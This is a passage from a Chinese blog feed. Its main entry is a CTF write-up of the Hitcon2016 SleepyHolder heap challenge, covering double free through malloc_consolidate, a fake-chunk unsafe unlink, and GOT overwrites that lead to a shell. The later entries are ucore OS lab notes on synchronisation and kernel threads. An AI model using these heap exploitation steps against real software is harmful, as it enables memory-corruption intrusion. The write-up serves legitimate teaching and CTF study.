&lt;p&gt;伪造的chunk也通常是fastbin，因为检查容易绕过。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--fastbin_dup_consolidate Hitcon2016--SleepyHolder</title>
    <link href="http://hhdx.xyz/2020/06/28/How2heap-fastbin-dup-consolidate-Hitcon2016-SleepyHolder/"/>
    <id>http://hhdx.xyz/2020/06/28/How2heap-fastbin-dup-consolidate-Hitcon2016-SleepyHolder/</id>
    <published>2020-06-28T15:01:43.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>Ubuntu 16.04</p><p>使用how2heap脚本编译glibc2.25，其中的4是编译线程数。脚本中<code>git clone</code>慢，可以替换成<a href="https://mirrors.tuna.tsinghua.edu.cn/">tsinghua mirrors</a>，把第83行的<code>git clone git://sourceware.org/git/glibc.git &quot;$SRC&quot;</code> 替换成<code> git clone https://mirrors.tuna.tsinghua.edu.cn/git/glibc.git &quot;$SRC&quot;</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./glibc_build.sh 2.25 -j 4 -disable-tcache</span></span><br></pre></td></tr></table></figure><p>做这道题目使用了glibc2.25，<code>patchelf --set-interpreter /path/to/ld-2.25.so /path/to/exe</code>，patch之后再运行程序就自动使用同目录下libc-2.25.so。</p><a id="more"></a><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><p>程序主要有以下三个功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br></pre></td></tr></table></figure><h3 id="Keep"><a href="#Keep" class="headerlink" title="Keep"></a>Keep</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flag )</span><br><span class="line">&#123;</span><br><span class="line">    ptr = <span class="built_in">calloc</span>(<span class="number">1</span>, size);</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Tell me your secret: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, ptr, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他可以分配的大小有small：40个字节，big：4000个字节，huge：400000个字节。flag表示其分配过没有，ptr来存储分配的指针，他们都是存储在bss段的全局变量。分别将他们称为small_ptr, small_flag; big_ptr, big_flag; huge_ptr, huge_flag，其布局如下</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200629161958717.png" alt="image-20200629161958717"></p><h3 id="Wipe"><a href="#Wipe" class="headerlink" title="Wipe"></a>Wipe</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">flag = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>指定free某块，huge大小的块不可以free。这里没有检查flag，也没有进行指针的置0，可以进行多次分配。</p><h3 id="Renew"><a href="#Renew" class="headerlink" title="Renew"></a>Renew</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Tell me your secret: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, ptr, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以对块中的内容进行更新，也是除了huge。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>正如fastbin_dup_consolidate中所所说的，使用<code>malloc_consolidate</code>可以造成fastbin的double free。第一次free fastbin会将其放到fastbin链表中，而后分配largebin，出于避免碎片化的目的，将会调用<code>malloc_consolidate</code>将fastbin中的chunk转移到unsortedbin并将相邻下一chunk的<code>pre_in_use</code>置0。后面遍历unsortedbin得不到使用，就会放到smallbin中。具体的过程可以看这张图片<a href="https://raw.githubusercontent.com/cloudburst/libheap/master/heap.png">heap.png</a>。</p><p>下面是glibc中malloc largebin前调用malloc_consolidate的注释。(不知道为什么glibc缩进这么诡异。。)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>题目中的利用过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keep(<span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">keep(<span class="number">2</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">wipe(<span class="number">1</span>)</span><br><span class="line">keep(<span class="number">3</span>, <span class="string">&quot;a&quot;</span>)        <span class="comment"># trigger malloc_consolidate</span></span><br><span class="line">wipe(<span class="number">1</span>)             <span class="comment"># double free</span></span><br></pre></td></tr></table></figure><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>题目中这个small大小的chunk，在放到unsortedbin中时，前chunk的<code>pre_in_use</code>位已经被清，第二次free回收fastbin中也没有检查，这里就可以利用unlink的攻击了。</p><p>再次分配此small块，在其中构造fake_chunk。free相邻的下一个big块，在它free过程中会进行前后chunk的探测，如果没有在使用就会进行合并。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.25/master 4014~4031</span></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在unlink中，会对fd-&gt;bk和bk-&gt;fd进行检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.25/master 1384~1389</span></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>在题目中，可以非常巧妙地使用small_ptr处存储的变量来绕过检查。如下面所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">small_ptr = <span class="number">0x6020D0</span></span><br><span class="line">fake_fd = small_ptr - <span class="number">0x18</span></span><br><span class="line">fake_bk = small_ptr - <span class="number">0x10</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk += p64(fake_fd) + p64(fake_bk) </span><br><span class="line">fake_chunk += p64(<span class="number">0x20</span>)</span><br><span class="line">keep(<span class="number">1</span>, fake_chunk)<span class="comment"># prepare for unsafe unlink</span></span><br><span class="line">wipe(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><code>fake_fd-&gt;bk</code>和<code>fake_bk-&gt;fd</code>等于small_ptr，且为伪造chunk的起始地址。之后unlink中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.25/master 1391~1392</span></span><br><span class="line">FD-&gt;bk = BK;      \</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>就将small_ptr存储的地址，覆盖为fake_fd。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x6020b0:0x00007f0863f6b6000x0000000000000000</span><br><span class="line">0x6020c0:0x0000000002308f000x00007f086412c010</span><br><span class="line">0x6020d0:0x00000000006020b80x0000000100000000</span><br><span class="line">0x6020e0:0x00000000000000010x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>由之前的bss布局图可以看到0x6020d0处存储的就是small_ptr，所以可以使用<code>renew(small)</code>进行对这几个变量覆写。</p><p>后面就不在展开了，就是把free_got改写成puts_plt进行泄露，然后把atoi_got改写成system地址，输入<code>sh\x00</code>就可以获得shell。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2016-SleepyHolder/exp.py">exp</a></p><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><p>how2heap fastbin_dup_consolidate.c</p></li><li><p><a href="https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder">https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前置&quot;&gt;&lt;a href=&quot;#前置&quot; class=&quot;headerlink&quot; title=&quot;前置&quot;&gt;&lt;/a&gt;前置&lt;/h2&gt;&lt;p&gt;Ubuntu 16.04&lt;/p&gt;
&lt;p&gt;使用how2heap脚本编译glibc2.25，其中的4是编译线程数。脚本中&lt;code&gt;git clone&lt;/code&gt;慢，可以替换成&lt;a href=&quot;https://mirrors.tuna.tsinghua.edu.cn/&quot;&gt;tsinghua mirrors&lt;/a&gt;，把第83行的&lt;code&gt;git clone git://sourceware.org/git/glibc.git &amp;quot;$SRC&amp;quot;&lt;/code&gt; 替换成&lt;code&gt; git clone https://mirrors.tuna.tsinghua.edu.cn/git/glibc.git &amp;quot;$SRC&amp;quot;&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; ./glibc_build.sh 2.25 -j 4 -disable-tcache&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;做这道题目使用了glibc2.25，&lt;code&gt;patchelf --set-interpreter /path/to/ld-2.25.so /path/to/exe&lt;/code&gt;，patch之后再运行程序就自动使用同目录下libc-2.25.so。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>ucore os lab7笔记</title>
    <link href="http://hhdx.xyz/2020/03/24/ucore-os-lab7%E7%AC%94%E8%AE%B0/"/>
    <id>http://hhdx.xyz/2020/03/24/ucore-os-lab7%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-24T15:39:11.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同步互斥"><a href="#同步互斥" class="headerlink" title="同步互斥"></a>同步互斥</h1><h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>互斥、死锁、饥饿</p><p><strong>互斥</strong>是指某一资源同时只允许一个进程对其进行访问，具有唯一性和排它性，但互斥不用限制进程对资源的访问顺序，即访问可以是无序的。</p><p><strong>同步</strong>是指在进程间的执行必须严格按照规定的某种先后次序来运行，即访问是有序的，这种先后次序取决于要系统完成的任务需求。</p><h3 id="17-临界区"><a href="#17-临界区" class="headerlink" title="17 临界区"></a>17 临界区</h3><p>空闲则入、忙则等待、有限等待、让权等待（可选）</p><p><strong>实现的三种办法</strong>：禁用中断、软件方法、更高级的抽象方法</p><p>方法比较主要考虑性能：并发级别</p><h4 id="禁用中断"><a href="#禁用中断" class="headerlink" title="禁用中断"></a>禁用中断</h4><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local_irq_save(<span class="keyword">unsigned</span> <span class="keyword">long</span> flags);</span><br><span class="line"><span class="comment">// critical section</span></span><br><span class="line">local_irq_restore(<span class="keyword">unsigned</span> <span class="keyword">long</span> flags);</span><br></pre></td></tr></table></figure><p>进入临界区：禁用所有中断，并保存标志</p><p>离开临界区：使能所有中断、并恢复标志</p><p><strong>缺点</strong>：</p><ul><li>禁用中断后，进程无法被停止：使整个系统都停下来；可能导致其他进程饥饿</li><li>临界区可能很长：无法确定响应中断所需的时间</li><li>不得不使用时，才采用</li></ul><h4 id="基于软件的同步解决方法"><a href="#基于软件的同步解决方法" class="headerlink" title="基于软件的同步解决方法"></a>基于软件的同步解决方法</h4><p><strong>Peterson算法(双进程)</strong></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200229200859621.png"></p><p><strong>Dekkers算法(多进程)</strong></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200229201728124.png"></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200229201801745.png"></p><p><strong>方法分析</strong>：复杂，需要进程间共享变量；需要忙等待，浪费CPU时间。</p><h4 id="更高级的抽象算法"><a href="#更高级的抽象算法" class="headerlink" title="更高级的抽象算法"></a>更高级的抽象算法</h4><p>现代CPU体系结构都提供一些特殊的原子操作指令。</p><p><strong>Test-and-Set</strong></p><p>相当于以下过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">boolean TestAndSet (boolean *target)‏</span><br><span class="line">&#123;</span><br><span class="line">boolean rv = *target;</span><br><span class="line">    *target = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> rv:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exchange</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void Exchange (boolean *a, boolean *b)‏</span><br><span class="line">&#123;</span><br><span class="line">boolean temp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = temp:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/os%20lock.png"></p><p>图左：spinlock(自旋锁无法实现先进先出)</p><p><strong>原子操作指令锁特征</strong></p><p><strong>优点</strong>：</p><ul><li>适用于单处理器或共享主存的多处理器中的任意数量的进程同步</li><li>简单容易证明</li><li>支持多临界区</li></ul><p><strong>缺点</strong></p><ul><li><p>可能的忙等待，消耗处理器时间</p></li><li><p>可能导致饥饿</p><p>进程离开临界区时，唤醒的次序</p></li><li><p>死锁</p><p>拥有临界区的低优先级进程</p><p>请求访问临界区的高优先级进程获得处理器并等待临界区</p></li></ul><h3 id="18-同步互斥"><a href="#18-同步互斥" class="headerlink" title="18 同步互斥"></a>18 同步互斥</h3><h4 id="信号量-semaphore"><a href="#信号量-semaphore" class="headerlink" title="信号量(semaphore)"></a>信号量(semaphore)</h4><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/semaphore.png"></p><p><strong>特性</strong>：</p><ul><li>信号量是被保护的整数变量<ul><li>初始化完成后，只能通过P()和V()操作修改</li><li>由操作系统保证，PV是原子操作</li></ul></li><li>P()可能阻塞，V()不会阻塞</li></ul><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/semaphore%20implement.png"></p><p><strong>两种信号量</strong>：二进制信号量、资源信号量。(二者等价，基于一个可以实现另一个)</p><p><strong>使用</strong>：互斥访问、条件同步</p><h5 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h5><p><strong>问题描述</strong>：一个或者多个生产者在生成数据后放在一个缓冲区里；单个消费者从缓冲区取出数据区里；任何时候只能有一个生产者或者消费者进入临界区。</p><p><strong>问题分析</strong></p><ul><li>任何一个时刻只能有一个线程操作缓冲区(互斥访问)</li><li>缓冲区空时，消费者必须等待生产者(条件同步)</li><li>缓冲区满时，生产者必须等待消费者(条件同步)</li></ul><p><strong>信号量描述约束</strong></p><ul><li>二进制信号量mutex</li><li>资源信号量fullBuffers</li><li>资源信号量emptyBuffers</li></ul><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/producer_consumer.png"></p><p><strong>信号量的困难</strong></p><p>读/开发代码困难、容易出错(使用的信号量被占用，忘记释放信号量)、不能够处理死锁</p><h4 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h4><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/monitor.png"></p><p>管程是一种用于多线程互斥访问共享资源的程序结构</p><ul><li>采用面向对象方法，简化了线程间的同步控制</li><li>任一时刻最多只有一个线程执行管程代码</li><li>正在管程中的线程可临时放弃管程的互斥访问，等待事件出现时恢复</li></ul><p>管程的使用</p><ul><li>在对象/模块中，收集相关共享数据</li><li>定义访问共享数据的方法</li></ul><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/monitor_compo.png"></p><p><strong>条件变量(Condition Variable)</strong></p><ul><li>条件变量是管程内的等待机制<ul><li>进入管程的线程因资源被占用而进入等待状态</li><li>每个条件变量表示一种等待原因，对应一个等待队列</li></ul></li><li>Wait()操作<ul><li>将自己阻塞在等待队列中</li><li>唤醒一个等待者或释放管程的互斥访问</li></ul></li><li>Signal()操作<ul><li>将等待队列中的一个线程唤醒</li><li>如果等待队列为空，则等同空操作</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/condition_variable_implement.png"></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/resolve_PC_monitor.png"></p><p><strong>管程分类</strong></p><p>Hoare管程存在两个缺陷：</p><ol><li>若产生signal的进程在管程内还未结束，则需要两次额外的切换：阻塞这个进程需要一次切换；管程可用时恢复有需要一次切换</li><li>与信号相关的进程调度必须非常可靠。产生一个signal必须立即激活相关条件队列中的一个进程，调度程序必须保证在激活前没有其他进程进入管程，否则进程被激活的条件就发生改变。</li></ol><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/classification_of_monitor.png"></p><p><strong>Hansen管程</strong></p><p>Hansen管程signal被notify所取代，可解释为：当一个正在管程中的进程执行<code>notify(x)</code>时，会使得<code>x</code>条件队列得到通知，但发信号的进程继续执行。通知的结果是未来会调度到该队列中的某个进程进行执行。但是，不能保证在他之前没有其他进程进入管程，因而被调度的这个等待进程必须重新检查条件。</p><p>这其中的区别就在于<code>if</code>和<code>while</code>的使用。这个方案对条件变量多了至少一次的检查，得到的回报是：不再有额外的进程切换，对等待进程之后什么时候运行没有任何限制。</p><p>因为<code>if</code>没有再次的检查机制，必须立即切换到等待的进程中，以防其他的进程进入管程破坏条件，所以是Hoare管程。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/2implement_of_monitor.png"></p><h5 id="读者写者问题"><a href="#读者写者问题" class="headerlink" title="读者写者问题"></a>读者写者问题</h5><p><strong>问题描述</strong></p><ul><li><p>共享数据的两类使用者</p><p>读者：只读取数据，不修改</p><p>写者：读取和修改数据</p></li><li><p>分析</p><p>“读-读”允许，“读-写”互斥，“写-写”互斥</p></li></ul><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/monitor_writer.png"><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/monitor_reader.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;同步互斥&quot;&gt;&lt;a href=&quot;#同步互斥&quot; class=&quot;headerlink&quot; title=&quot;同步互斥&quot;&gt;&lt;/a&gt;同步互斥&lt;/h1&gt;&lt;h2 id=&quot;理论&quot;&gt;&lt;a href=&quot;#理论&quot; class=&quot;headerlink&quot; title=&quot;理论&quot;&gt;&lt;/a&gt;理论&lt;/h2&gt;&lt;p&gt;互斥、死锁、饥饿&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;互斥&lt;/strong&gt;是指某一资源同时只允许一个进程对其进行访问，具有唯一性和排它性，但互斥不用限制进程对资源的访问顺序，即访问可以是无序的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同步&lt;/strong&gt;是指在进程间的执行必须严格按照规定的某种先后次序来运行，即访问是有序的，这种先后次序取决于要系统完成的任务需求。&lt;/p&gt;
&lt;h3 id=&quot;17-临界区&quot;&gt;&lt;a href=&quot;#17-临界区&quot; class=&quot;headerlink&quot; title=&quot;17 临界区&quot;&gt;&lt;/a&gt;17 临界区&lt;/h3&gt;&lt;p&gt;空闲则入、忙则等待、有限等待、让权等待（可选）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实现的三种办法&lt;/strong&gt;：禁用中断、软件方法、更高级的抽象方法&lt;/p&gt;
&lt;p&gt;方法比较主要考虑性能：并发级别&lt;/p&gt;
&lt;h4 id=&quot;禁用中断&quot;&gt;&lt;a href=&quot;#禁用中断&quot; class=&quot;headerlink&quot; title=&quot;禁用中断&quot;&gt;&lt;/a&gt;禁用中断&lt;/h4&gt;</summary>
    
    
    
    
    <category term="ucore os lab" scheme="http://hhdx.xyz/tags/ucore-os-lab/"/>
    
    <category term="OS" scheme="http://hhdx.xyz/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>ucore os lab4笔记</title>
    <link href="http://hhdx.xyz/2020/03/17/ucore-os-lab4%E7%AC%94%E8%AE%B0/"/>
    <id>http://hhdx.xyz/2020/03/17/ucore-os-lab4%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-17T15:14:13.000Z</published>
    <updated>2020-10-17T09:07:20.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内核线程管理"><a href="#内核线程管理" class="headerlink" title="内核线程管理"></a>内核线程管理</h1><h2 id="实验执行流程综述"><a href="#实验执行流程综述" class="headerlink" title="实验执行流程综述"></a>实验执行流程综述</h2><p>内核线程是一种特殊的进程，内核线程与用户进程的区别有两个：</p><ul><li>内核线程只运行在内核态而用户进程会在在用户态和内核态交替运行；</li><li>所有内核线程直接使用共同的ucore内核内存空间，不需为每个内核线程维护单独的内存空间而用户进程需要维护各自的用户内存空间。</li></ul><h2 id="进程的属性与特征解析"><a href="#进程的属性与特征解析" class="headerlink" title="进程的属性与特征解析"></a>进程的属性与特征解析</h2><a id="more"></a><blockquote><h4 id="1-资源管理"><a href="#1-资源管理" class="headerlink" title="1. 资源管理"></a>1. 资源管理</h4><p>在计算机系统中，进程会占用内存和CPU，这都是有限的资源，如果不进行合理的管理，资源会耗尽或无法高效公平地使用，从而会导致计算机系统中的多个进程执行效率很低，甚至由于资源不够而无法正常执行。</p><p>对于用户进程而言，操作系统是它的“上帝”，操作系统给了用户进程可以运行所需的资源，最基本的资源就是内存和CPU。在实验二/三中涉及的内存管理方法和机制可直接应用到进程的内存资源管理中来。在有多个进程存在的情况下，对于CPU这种资源，则需要通过进程调度来合理选择一个进程，并进一步通过进程分派和进程切换让不同的进程分时复用CPU，执行各自的工作。对于无法剥夺的共享资源，如果资源管理不当，多个进程会出现死锁或饥饿现象。</p><h4 id="2-进程状态管理"><a href="#2-进程状态管理" class="headerlink" title="2. 进程状态管理"></a>2. 进程状态管理</h4><p>用户进程有不同的状态（可理解为“生命”的不同阶段），当操作系统把程序的放到内存中后，这个进程就“诞生”了，不过还没有开始执行，但已经消耗了内存资源，处于“创建”状态；当进程准备好各种资源，就等能够使用CPU时，进程处于“就绪”状态；当进程终于占用CPU，程序的指令被CPU一条一条执行的时候，这个进程就进入了“运行”状态，这时除了继续占用内存资源外，还占用了CPU资源；当进程由于等待某个资源而无法继续执行时，进程可放弃CPU使用，即释放CPU资源，进入“等待”状态；当程序指令执行完毕，由操作系统回收进程所占用的资源时，进程进入了“死亡”状态。</p><p>这些进程状态的转换时机需要操作系统管理起来，而且进程的创建和清除等服务必须由操作系统提供，而且在“运行”与“就绪”/“等待”状态之间的转换，涉及到保存和恢复进程的“执行现场”，也就是进程上下文，这是确保进程即使“断断续续”地执行，也能正确完成工作的必要保证。</p><h4 id="3-进程与线程"><a href="#3-进程与线程" class="headerlink" title="3. 进程与线程"></a>3. 